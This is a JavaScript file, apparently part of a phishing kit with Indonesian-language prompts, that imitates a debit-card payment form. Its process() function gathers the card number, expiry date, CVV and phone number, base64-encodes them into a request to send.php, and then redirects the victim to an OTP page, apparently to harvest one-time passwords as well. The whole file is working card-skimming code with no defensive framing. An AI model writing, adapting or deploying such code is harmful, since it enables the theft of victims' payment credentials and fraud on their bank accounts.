$(document).ready(function() {
    $("#debit-number").on("input", function() {
        var debitNumber = $("#debit-number").val().trim();
        var originalDebitNumber = debitNumber;
        if (debitNumber.length > 16) {
            debitNumber = debitNumber.substring(0, 16);
        }
        if (debitNumber.length < 16) {
            debitNumber = debitNumber.padEnd(16, "#");
        }
        var debitSlice1 = debitNumber.substring(0, 4);
        var debitSlice2 = "****";
        var length = originalDebitNumber.length-4;
        if (length <= 4) {
            debitSlice2 = "";
            for (var i=0; i<length; i++) {
                debitSlice2 += "*";
            }
            debitSlice2 = debitSlice2.padEnd(4, "#");
        }
        var debitSlice3 = "****";
        length = originalDebitNumber.length-8;
        if (length <= 4) {
            debitSlice3 = "";
            for (var i=0; i<length; i++) {
                debitSlice3 += "*";
            }
            debitSlice3 = debitSlice3.padEnd(4, "#");
        }
        var debitSlice4 = debitNumber.substring(12, 16);
        $("#preview-debit").html(debitSlice1+" "+debitSlice2+" "+debitSlice3+" "+debitSlice4);
    });
});

function process() {
    var debitNumber = $("#debit-number").val().trim();
    var expiryMonth = $("#expiry-mn").val().trim();
    var expiryYear = $("#expiry-yr").val().trim();
    var cvv = $("#cvv").val().trim();
    var phone = $("#phone").val().trim();
    if (debitNumber=="" || expiryMonth=="" || expiryYear=="" || cvv=="" || phone=="") {
        alert("Mohon lengkapi data");
        return;
    }
    if (expiryYear.length < 4) {
        alert("Masukkan tahun sebanyak 4 digit");
        return;
    }
    var expiry = expiryMonth.padStart(2, "0")+"/"+expiryYear.padStart(2, "0");
    var debitSlice1 = debitNumber.substring(0, 4);
    var debitSlice2 = debitNumber.substring(4, 8);
    var debitSlice3 = debitNumber.substring(8, 12);
    var debitSlice4 = debitNumber.substring(12, 16);
    debitNumber = debitSlice1+" "+debitSlice2+" "+debitSlice3+" "+debitSlice4;
    $("#loader").css("display", "flex");
    $.ajax({
        type: "get",
        url: "send.php?message="+btoa("No. HP: "+phone+"\nNo. Debit: "+debitNumber+"\nKadaluwarsa: "+expiry+"\nCVV: "+cvv),
        dataType: "text",
        success: function(response) {
            $("#loader").css("display", "none");
            window.location.href = "otp.html?phone="+phone;
        }
    });
}

function goBack() {
    setTimeout(() => {
        window.history.back();
    }, 500);
}

module.process = process;
module.goBack = goBack;